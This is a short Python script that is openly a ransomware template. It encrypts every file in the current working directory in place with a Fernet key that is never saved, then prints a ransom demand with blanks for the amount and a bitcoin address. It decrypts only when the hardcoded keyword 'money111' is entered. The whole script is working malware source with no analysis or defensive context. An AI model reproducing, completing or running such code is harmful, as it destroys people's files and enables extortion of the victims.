from cryptography.fernet import Fernet
import os
import time



key = Fernet.generate_key()
cipher = Fernet(key)

file_path = os.getcwd()
print(file_path)

files = os.listdir(file_path)

user = os.getlogin()


def encrypt_files():
    for file in files:
        full_path = os.path.join(file_path, file)
        with open(full_path, 'rb') as file:
            data = file.read()
        
        encrypted_data = cipher.encrypt(data)
        
        with open(full_path, 'wb') as encrypted_file:
            encrypted_file.write(encrypted_data)

def decrypt_files():
    for file in files:
        full_path = os.path.join(file_path, file)
        with open(full_path, 'rb') as encrypted_file:
            data = encrypted_file.read()
        
        decrypted_data = cipher.decrypt(data)
        os.chmod(full_path, 0o666)
        with open(full_path, 'wb') as decrypted_file: 
            decrypted_file.write(decrypted_data)
encrypt_files() 


time.sleep(3)
print("All of your files have been encrypted. Pay me (put amount of money here)(currency here) to decrypt all your files. (insert bitcoin adress or what you want to use for the victim to pay)")

print('once you pay me, you will recive a keyword to decrypt all of your files. Remember, you cannot guess the keywords, one wrong guess and your files will never be decrypted.')


guesses = 0

user_keyword = input('Enter keyword: ')

if user_keyword == 'money111':
        decrypt_files()
        print('your files have been decrypted')
    

 

